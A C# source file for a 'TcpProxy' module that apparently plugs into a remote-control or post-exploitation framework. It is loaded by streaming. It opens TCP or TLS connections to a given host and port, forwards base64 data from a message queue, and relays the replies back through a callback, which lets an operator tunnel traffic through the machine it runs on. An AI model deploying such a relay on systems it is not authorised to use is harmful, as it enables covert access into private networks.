using System.Linq;
using System;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Threading;
using System.Collections.Generic;
using System.IO;
using System.Net.Security;

namespace TcpProxy
{
    public class Program
    {

        public static int Main()
        {
            Console.WriteLine("Module needs to be streamed");
            return 0;
        }

        public static void Stream(Func<object, Task> cb, string[] args, Queue<Dictionary<string, string>> queue, int jobId)
        {
            var targetHost = args[0];
            var targetPort = int.Parse(args[1]);
            List<Job> jobs = new List<Job>();
            cb(new
            {
                returnType = 6,
                output = new
                {
                    host = targetHost,
                    port = targetPort,
                    jobId = jobId
                }
            });
            while (true)
            {
                if (queue.Any())
                {
                    var message = queue.Dequeue();

                    if (message.ContainsKey("data"))
                    {

                        Thread myNewThread = new Thread(() => OpenConnection(cb, message, targetPort, targetHost));
                        myNewThread.Start();

                        jobs.Add(new Job
                        {
                            Id = message["connection_id"],
                            Thread = myNewThread
                        });
                    }
                    else
                    {
                        var job = jobs.FirstOrDefault(j => j.Id == message["connection_id"]);

                        if (job != null)
                        {
                            job.Thread.Abort();
                            jobs.Remove(job);
                        }
                    }
                }
                else
                {
                    Thread.Sleep(100);
                }
            }
        }

        private static void OpenConnection(Func<object, Task> cb, Dictionary<string, string> response, int targetPort, string targetHost)
        {
            try
            {
                TcpClient tcpClient = new TcpClient();
                tcpClient.Connect(targetHost, targetPort);
                Stream networkStream = null;

                if (targetPort == 443)
                {
                    var coolSSLThing = new SslStream(tcpClient.GetStream());
                    coolSSLThing.AuthenticateAsClient(targetHost);
                    networkStream = coolSSLThing;
                }
                else
                {
                    networkStream = tcpClient.GetStream();
                }

                var bytes = Convert.FromBase64String(response["data"].ToString());

                if (targetPort == 443 || targetPort == 80)
                {
                    var coolString = System.Text.Encoding.UTF8.GetString(bytes).Replace("{ClientHost}", targetHost);
                    bytes = System.Text.Encoding.UTF8.GetBytes(coolString);
                }

                networkStream.Write(bytes, 0, bytes.Length);

                var targetBuffer = new byte[65536];

                while (tcpClient.Connected)
                {
                    var count = networkStream.Read(targetBuffer, 0, targetBuffer.Length);
                    cb(new
                    {
                        returnType = 5,
                        output = new
                        {
                            data = Convert.ToBase64String(targetBuffer.Take(count).ToArray()),
                            host = targetHost,
                            port = targetPort,
                            connectionId = response["connection_id"],
                        }
                    });
                }

                tcpClient.Close();
                networkStream.Close();
                tcpClient.Dispose();
                networkStream.Close();
            }
            catch (Exception ex)
            {
                Console.WriteLine("Failed when trying to accept new clients with '{0}'", (object)ex.ToString());
            }
        }

        public class Job
        {
            public string Id;
            public Thread Thread;
        }

    }
}